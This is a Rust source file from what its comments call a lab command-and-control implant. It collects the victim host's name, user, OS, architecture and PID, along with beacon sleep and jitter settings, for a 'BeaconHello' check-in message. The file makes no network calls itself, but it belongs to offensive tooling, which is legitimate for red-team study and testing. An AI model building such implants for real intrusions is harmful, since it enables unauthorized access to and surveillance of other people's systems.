// sysinfo.rs — collect host info for BeaconHello
//
// kept minimal. we don't need a full SMBIOS dump for a lab C2.
// hostname + username + os string + pid is enough to identify a session.

use serde::Serialize;

use crate::config::Config;

#[derive(Debug, Serialize)]
pub struct BeaconHello {
    pub hostname:   String,
    pub username:   String,
    pub os:         String,
    pub arch:       String,
    pub pid:        u32,
    pub sleep_ms:   u64,
    pub jitter_pct: u8,
}

pub fn build_hello(cfg: &Config) -> BeaconHello {
    BeaconHello {
        hostname:   hostname(),
        username:   username(),
        os:         os_string(),
        arch:       std::env::consts::ARCH.to_owned(),
        pid:        std::process::id(),
        sleep_ms:   cfg.sleep_ms,
        jitter_pct: cfg.jitter_pct,
    }
}

fn hostname() -> String {
    // no external crate — just read /etc/hostname on linux
    // windows has a different path but this is primarily a linux implant for now
    #[cfg(unix)]
    {
        std::fs::read_to_string("/etc/hostname")
            .unwrap_or_else(|_| "unknown".to_owned())
            .trim()
            .to_owned()
    }
    #[cfg(windows)]
    {
        std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".to_owned())
    }
}

fn username() -> String {
    std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "unknown".to_owned())
}

fn os_string() -> String {
    // read /etc/os-release if available, fall back to uname
    #[cfg(unix)]
    {
        if let Ok(content) = std::fs::read_to_string("/etc/os-release") {
            for line in content.lines() {
                if let Some(val) = line.strip_prefix("PRETTY_NAME=") {
                    return val.trim_matches('"').to_owned();
                }
            }
        }
        // fallback
        format!("{} {}", std::env::consts::OS, std::env::consts::ARCH)
    }
    #[cfg(windows)]
    {
        "Windows".to_owned()
    }
}
// sysinfo
